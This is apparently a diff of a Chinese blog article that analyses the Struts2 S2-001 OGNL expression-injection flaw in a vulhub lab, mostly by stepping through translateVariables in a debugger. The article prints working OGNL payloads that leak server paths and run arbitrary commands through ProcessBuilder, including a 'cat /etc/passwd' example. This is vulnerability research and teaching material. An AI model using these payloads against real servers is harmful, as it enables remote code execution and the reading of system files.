@@ -5,7 +5,7 @@
 
 
                                 阅读量   
-                                **57298**
+                                **57478**
                             
                         |
                         
@@ -40,9 +40,9 @@
 &lt;/s:form&gt;
 ```
 
-此时，恶意用户可以将phoneNumber字段置空以触发验证错误，再控制name字段的值为 %%7B1+1%7D。当表单被重新展示给用户时，name字段的值将为2。产生这种情况的原因是这个字段默认被当作%%7Bname%7D处理，由于OGNL表达式被递归处理，处理的效果等同于%%7B%%7B1+1%7D%7D。实际上，相关的OGNL解析代码在XWork组件中，并不在WebWork 2或Struts 2内。
+此时，恶意用户可以将phoneNumber字段置空以触发验证错误，再控制name字段的值为 %`{`1+1`}`。当表单被重新展示给用户时，name字段的值将为2。产生这种情况的原因是这个字段默认被当作%`{`name`}`处理，由于OGNL表达式被递归处理，处理的效果等同于%`{`%`{`1+1`}``}`。实际上，相关的OGNL解析代码在XWork组件中，并不在WebWork 2或Struts 2内。
 
-用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %%7Bvalue%7D 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %%7Bvalue%7D 对提交的数据执行了一次 OGNL 表达式解析，所以可以构造 payload 进行命令执行。
+用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %`{`value`}` 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %`{`value`}` 对提交的数据执行了一次 OGNL 表达式解析，所以可以构造 payload 进行命令执行。
 
 提交表单并验证失败时，由于Strust2默认会原样返回用户输入的值而且不会跳转到新的页面，因此当返回用户输入的值并进行标签解析时，如果开启了altSyntax，会调用translateVariables方法对标签中表单名进行OGNL表达式递归解析返回ValueStack值栈中同名属性的值。因此我们可以构造特定的表单值让其进行OGNL表达式解析从而达到任意代码执行。
 
@@ -96,14 +96,14 @@ services:
 
 [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a84690243a06cff8.png)
 
-其中的password存在漏洞，用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %%7Bvalue%7D 进行解析，然后重新填充到对应的表单数据中。
+其中的password存在漏洞，用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %`{`value`}` 进行解析，然后重新填充到对应的表单数据中。
 
-在translateVariables方法中，递归解析表达式，在处理完%%7Bpassword%7D后将password的值直接取出并继续在while循环中解析，若用户输入的password是恶意的ognl表达式，则得以解析执行。
+在translateVariables方法中，递归解析表达式，在处理完%`{`password`}`后将password的值直接取出并继续在while循环中解析，若用户输入的password是恶意的ognl表达式，则得以解析执行。
 
 按照vulhub的提示，我们可以使用如下命令获取tomcat执行路径：
 
 ```
-%%7B"tomcatBinDir%7B"+@java.lang.System@getProperty("user.dir")+"%7D"%7D
+%`{`"tomcatBinDir`{`"+@java.lang.System@getProperty("user.dir")+"`}`"`}`
 ```
 
 [![](https://p2.ssl.qhimg.com/t0104173778815eefcd.png)](https://p2.ssl.qhimg.com/t0104173778815eefcd.png)
@@ -117,13 +117,13 @@ services:
 获取Web路径：
 
 ```
-%%7B#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()%7D
+%`{`#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()`}`
 ```
 
-执行任意命令（命令加参数：`new java.lang.String[]%7B"cat","/etc/passwd"%7D`）：
+执行任意命令（命令加参数：`new java.lang.String[]`{`"cat","/etc/passwd"`}``）：
 
 ```
-%%7B#a=(new java.lang.ProcessBuilder(new java.lang.String[]%7B"pwd"%7D)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()%7D
+%`{`#a=(new java.lang.ProcessBuilder(new java.lang.String[]`{`"pwd"`}`)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()`}`
 ```
 
 ### <a class="reference-link" name="%EF%BC%88%E4%B8%89%EF%BC%89%E8%B0%83%E8%AF%95"></a>（三）调试
@@ -234,7 +234,7 @@ invokeAction调用了action（LoginAction）的method（execute），
 
 [![](https://p4.ssl.qhimg.com/t01e2d1967fd02f853b.png)](https://p4.ssl.qhimg.com/t01e2d1967fd02f853b.png)
 
-前面提到，altSyntax默认是开启的，接下来的expr显而易见为%%7Bpassword%7D，
+前面提到，altSyntax默认是开启的，接下来的expr显而易见为%`{`password`}`，
 
 [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0126761c99f2cedcb0.png)
 
@@ -254,7 +254,7 @@ invokeAction调用了action（LoginAction）的method（execute），
 
 二级步入，将进入调试的主体部分`translateVariables(char open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)`，
 
-此处传入的expression为%%7Bpassword%7D，
+此处传入的expression为%`{`password`}`，
 
 [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01fd2b90eda5eba914.png)
 
@@ -266,7 +266,7 @@ invokeAction调用了action（LoginAction）的method（execute），
 
 [![](https://p5.ssl.qhimg.com/t0196864846bb30e97e.png)](https://p5.ssl.qhimg.com/t0196864846bb30e97e.png)
 
-接下来，取出%%7B%7D表达式中的值，赋值给var，
+接下来，取出%`{``}`表达式中的值，赋值给var，
 
 [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013987ff6174e2b6ab.png)
 
@@ -342,9 +342,9 @@ getProperty:1643, OgnlRuntime (ognl)getValueBody:92, ASTProperty (ognl)evaluateG
 
 我们观察到，此while循环只有一个出口，那就是if (start == -1 || end == -1 || count != 0)，因此这里进行完expression的赋值后，会开启新的一轮while。
 
-这里我们可以看出，translateVariables无意之间递归解析了表达式，我们的password字段放置了`%%7B"tomcatBinDir%7B"+[@java](https://github.com/java).lang.System[@getProperty](https://github.com/getProperty)("user.dir")+"%7D"%7D`这样一个包含`%%7Bexpression%7D`的字符串，%%7Bpassword%7D的结果将再次被当作expression解析，就可能造成恶意ognl表达式的执行。
+这里我们可以看出，translateVariables无意之间递归解析了表达式，我们的password字段放置了`%`{`"tomcatBinDir`{`"+[@java](https://github.com/java).lang.System[@getProperty](https://github.com/getProperty)("user.dir")+"`}`"`}``这样一个包含`%`{`expression`}``的字符串，%`{`password`}`的结果将再次被当作expression解析，就可能造成恶意ognl表达式的执行。
 
-此次循环中，进入findValue的var是去掉前两个字符的expression，也就是`tomcatBinDir%7B"+[@java](https://github.com/java).lang.System[@getProperty](https://github.com/getProperty)("user.dir")+"%7D`。
+此次循环中，进入findValue的var是去掉前两个字符的expression，也就是`tomcatBinDir`{`"+[@java](https://github.com/java).lang.System[@getProperty](https://github.com/getProperty)("user.dir")+"`}``。
 
 [![](https://p3.ssl.qhimg.com/t01c2e22c549275f347.png)](https://p3.ssl.qhimg.com/t01c2e22c549275f347.png)
 
@@ -363,7 +363,7 @@ getValue:210, SimpleNode (ognl)，
 
 在对于第一行的getValue()进行跟进几层之后，经过了一些表达式执行的操作，得到了result的第一部分。
 
-接下来的for循环，会继续执行完整表达式`%%7B"tomcatBinDir%7B"+[@java](https://github.com/java).lang.System[@getProperty](https://github.com/getProperty)("user.dir")+"%7D"%7D`的其他部分。
+接下来的for循环，会继续执行完整表达式`%`{`"tomcatBinDir`{`"+[@java](https://github.com/java).lang.System[@getProperty](https://github.com/getProperty)("user.dir")+"`}`"`}``的其他部分。
 
 [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t010243f1f95ac9e538.png)
 
@@ -383,9 +383,9 @@ getValue:210, SimpleNode (ognl)，
 
 [![](https://p1.ssl.qhimg.com/t017abf4b5ad76d4686.png)](https://p1.ssl.qhimg.com/t017abf4b5ad76d4686.png)
 
-逐级步出，回到TextParseUtil.translateVariables，expression被拼接为tomcatBinDir%7B/usr/local/tomcat%7D，开启一个新的循环。
+逐级步出，回到TextParseUtil.translateVariables，expression被拼接为tomcatBinDir`{`/usr/local/tomcat`}`，开启一个新的循环。
 
-但是此时，open为%，expression.indexOf(open + “%7B“)为-1，而start为-1时，将会return。
+但是此时，open为%，expression.indexOf(open + “`{`“)为-1，而start为-1时，将会return。
 
 [![](https://p1.ssl.qhimg.com/t0123547bde3864375b.png)](https://p1.ssl.qhimg.com/t0123547bde3864375b.png)
 
